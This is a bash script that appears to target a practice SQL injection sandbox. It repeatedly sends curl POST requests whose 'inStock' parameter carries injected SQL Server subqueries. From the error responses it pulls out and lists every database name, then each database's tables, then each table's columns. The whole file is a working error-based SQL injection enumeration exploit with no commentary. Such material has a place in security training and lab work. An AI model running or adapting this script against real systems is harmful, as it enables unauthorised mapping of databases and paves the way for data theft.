#!/bin/bash
for i in {0..200}
do
	dbName=$(curl -i -s -k -X "POST" \
		-H "Host: sql-sandbox" \
		-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36" \
		-H "Content-Type: application/x-www-form-urlencoded;charset=UTF-8" \
		-H "Accept: */*" \
		-H "Origin: http://sql-sandbox" \
		-H "Referer: http://sql-sandbox/exploit/error" \
		-H "Accept-Encoding: gzip, deflate" \
		-H "Accept-Language: en-US,en;q=0.9" \
		-H "Connection: close" \
		--data-binary "inStock=(SELECT name FROM sys.databases ORDER BY name OFFSET $i ROWS FETCH NEXT 1 ROWS ONLY ; )&name=e&sort=name&order=asc" \
		"http://sql-sandbox/exploit/api/error" | grep "error" | cut -d "'" -f 4 )

	[[ "$dbName" == "$oldDbName" ]] && break
	[[ ! -z "$dbName" ]] && echo "Database name:  $dbName" || break
	oldDbName="$dbName"

	for j in {0..200}	
	do
		tabName=$(curl -i -s -k \
			-X "POST" \
			-H "Host: sql-sandbox" \
			-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36" \
			-H "Content-Type: application/x-www-form-urlencoded;charset=UTF-8" \
			-H "Accept: */*" \
			-H "Origin: http://sql-sandbox" \
			-H "Referer: http://sql-sandbox/exploit/error" \
			-H "Accept-Encoding: gzip, deflate" \
			-H "Accept-Language: en-US,en;q=0.9" \
			-H "Connection: close" \
			--data-binary "inStock=(SELECT name FROM $dbName.sys.tables ORDER BY name OFFSET $j ROWS FETCH NEXT 1 ROWS ONLY ; )&name=e&sort=name&order=asc" \
			"http://sql-sandbox/exploit/api/error" | grep error | cut -d "'" -f 4 )
		[[ "$tabName" == "$oldTabName" ]] && break
		[[ ! -z "$tabName" ]] && echo "   Table: $tabName" || break
		oldTabName="$tabName"

		for k in {0..200}
		do
			colName=$(curl -i -s -k \
				-X "POST"\
				-H "Host: sql-sandbox" \
				-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36" \
				-H "Content-Type: application/x-www-form-urlencoded;charset=UTF-8" \
				-H "Accept */*" \
				-H "Origin: http://sql-sandbox" \
				-H "Referer: http://sql-sandbox/exploit/error" \
				-H "Accept-Encoding: gzip, deflate" \
				-H "Accept-Language: en-US,en;q=0.9" \
				-H "Connection: close" \
				--data-binary "inStock=(SELECT name FROM $dbName.sys.columns WHERE object_id = OBJECT_ID('$dbName.dbo.$tabName') ORDER BY name OFFSET $k ROWS FETCH NEXT 1 ROWS ONLY ; )&name=e&sort=name&order=asc" \
				"http://sql-sandbox/exploit/api/error" | grep error | cut -d "'" -f 4 )
			[[ "$colName" == "$oldColName" ]] && break
			[[ ! -z "$colName" ]] && echo "      Column: $colName" || break
			oldColName="$colName"
		done				
	done
done
